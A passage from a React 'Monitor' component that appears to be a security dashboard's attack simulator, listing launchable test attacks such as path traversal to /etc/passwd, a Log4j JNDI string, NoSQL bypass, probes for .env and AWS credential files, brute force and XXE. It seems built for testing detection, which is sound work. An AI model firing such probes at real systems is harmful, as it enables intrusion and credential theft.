                    desc: 'Requests directory escape paths to /etc/passwd and win.ini',
                    icon: '📁',
                  },
                  {
                    type: 'log4j',
                    name: 'Log4j / JNDI (CVE-2021-44228)',
                    desc: 'Injects ${jndi:ldap://...} strings into headers and credentials',
                    icon: '🪵',
                  },
                  {
                    type: 'nosql',
                    name: 'NoSQL Operator Injection',
                    desc: 'Submits MongoDB $gt and $ne logical comparison bypass objects',
                    icon: '🍃',
                  },
                  {
                    type: 'secrets',
                    name: 'Sensitive Secret Harvesting',
                    desc: 'Probes exposed /.env, /.git/config, and AWS credentials files',
                    icon: '🔑',
                  },
                  {
                    type: 'brute',
                    name: 'Brute Force Flooding',
                    desc: 'Simulates credential stuffing dictionary flood via Hydra signature',
                    icon: '🔓',
                  },
                  {
                    type: 'scanner',
                    name: 'Reconnaissance Scanner',
                    desc: 'Probes web directory root and robots.txt with Nikto scanner signature',
                    icon: '🕵️',
                  },
                  {
                    type: 'xxe',
                    name: 'XML External Entity (XXE)',
                    desc: 'Submits XML payload with SYSTEM entity file read exploit',
                    icon: '📜',
                  },
                  {
                    type: 'benign',
                    name: 'Normal Benign Probe',
                    desc: 'Authentic corporate user authentication and dashboard browsing',
                    icon: '🟢',
                  },
                ].map((item) => (
                  <div className="threat-launch-card" key={item.type}>
                    <div className="threat-launch-meta">
                      <h4>
                        <span>{item.icon}</span> {item.name}
                      </h4>
                      <p>{item.desc}</p>
                    </div>

                    <button
                      className="threat-fire-btn"
                      onClick={() => handleLaunchAttack(item.type)}
                      disabled={simulatingType !== null}
                    >
                      {simulatingType === item.type ? 'Dispatching Payload...' : `Fire ${item.name}`}
                    </button>
                  </div>
                ))}
              </div>
            </div>

            <div className="modal-footer">
              <button className="control-btn" onClick={() => setShowLauncherModal(false)}>
                Close Simulator
              </button>
            </div>
          </div>
        </div>
      )}
    </div>
  )
}

export default Monitor
